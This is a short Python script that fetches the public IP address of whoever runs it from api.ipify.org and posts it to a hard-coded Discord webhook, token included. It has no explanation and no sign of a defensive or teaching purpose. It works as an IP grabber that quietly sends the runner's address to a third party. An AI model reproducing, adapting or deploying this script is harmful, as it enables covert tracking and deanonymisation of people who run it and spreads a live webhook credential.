import requests

url = "https://api.ipify.org?format=json"
webhook = "https://discord.com/api/webhooks/1365047831538307102/ErI1HHPfuChC7UCM1LNEvZA73vmmIx9L8c-pTEPuoWZvVymx4JZ4gaAMO_QNs0P0vpFD"

def getip():
    ip = requests.get(url).text
    return ip

def sendip():
    ip = getip()
    data = {
        "content": ip
    }
    return requests.post(webhook, json=data)

def main():
    sendip()
main()